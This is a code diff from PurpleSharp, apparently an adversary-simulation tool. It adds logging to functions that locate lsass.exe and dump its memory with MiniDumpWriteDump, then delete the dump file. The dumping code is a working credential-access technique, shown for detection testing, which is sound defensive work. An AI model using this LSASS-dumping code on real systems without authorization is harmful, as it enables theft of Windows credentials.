@@ -64,10 +64,10 @@ namespace PurpleSharp.Simulations
         }
    
         
-        public static void LsassRead()
+        public static void LsassRead(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-            Lib.Logger logger = new Lib.Logger(currentPath + "PurpleSharp.txt");
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
 
             if (!IsHighIntegrity())
             {
@@ -125,10 +125,10 @@ namespace PurpleSharp.Simulations
         }
 
         //Adapted from https://github.com/GhostPack/SharpDump
-        public static void LsassMemoryDump()
+        public static void LsassMemoryDump(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-            Lib.Logger logger = new Lib.Logger(currentPath + "PurpleSharp.txt");
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
 
             logger.TimestampInfo(String.Format("Starting LSASS Dump on {0}  ", Environment.MachineName));
 
@@ -136,18 +136,29 @@ namespace PurpleSharp.Simulations
             IntPtr targetProcessHandle = IntPtr.Zero;
             uint targetProcessId = 0;
 
-            if (!IsHighIntegrity())
+            
+
+            try
             {
-                logger.TimestampInfo("[X] Not running in high integrity, exitting.");
-                Console.WriteLine("[X] Not running in high integrity, exitting.");
-                return;
+                if (!IsHighIntegrity())
+                {
+                    logger.TimestampInfo("[X] Not running in high integrity, exitting.");
+                    Console.WriteLine("[X] Not running in high integrity, exitting.");
+                    //return;
+                }
+            }
+            catch (Exception ex)
+            {
+                logger.TimestampInfo(ex.Message);
             }
             
             Process targetProcess = null;
             Process[] processes = Process.GetProcessesByName("lsass");
             targetProcess = processes[0];
+            
 
             targetProcessId = (uint)targetProcess.Id;
+            logger.TimestampInfo(String.Format("Identified lsass.exe with Process ID:{0}", targetProcessId));
             targetProcessHandle = targetProcess.Handle;
 
             bool bRet = false;
@@ -155,23 +166,26 @@ namespace PurpleSharp.Simulations
 
             string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
             string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
-
+            
             using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
             {
                 bRet = WinAPI.MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                logger.TimestampInfo(String.Format("Calling MiniDumpWriteDump"));
                 errorCode = Marshal.GetLastWin32Error();
             }
-
+            
             if (bRet)
             {
                 DateTime dtime = DateTime.Now;
-                Console.WriteLine("{0}[{1}] LSASS dump successful on {2} running as {3}", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), Environment.MachineName, 
-                    WindowsIdentity.GetCurrent().Name);
+                logger.TimestampInfo(String.Format("LSASS successfully dumped to {0}\\Temp\\debug{1}.out", systemRoot, targetProcessId));
+                Console.WriteLine("{0}[{1}] LSASS dump successful on {2} running as {3}", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), Environment.MachineName, WindowsIdentity.GetCurrent().Name);
                 File.Delete(dumpFile);
+                logger.TimestampInfo(String.Format("Dump file deleted"));
                 Console.WriteLine("[*] Dump file deleted");
             }
             else
             {
+                logger.TimestampInfo(String.Format("LSASS dump failed!"));
                 DateTime dtime = DateTime.Now;
                 Console.WriteLine("{0}[{1}] LSASS dump failed on {2} running as {3}. Error Code {4}", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), Environment.MachineName, WindowsIdentity.GetCurrent().Name, errorCode);
             }
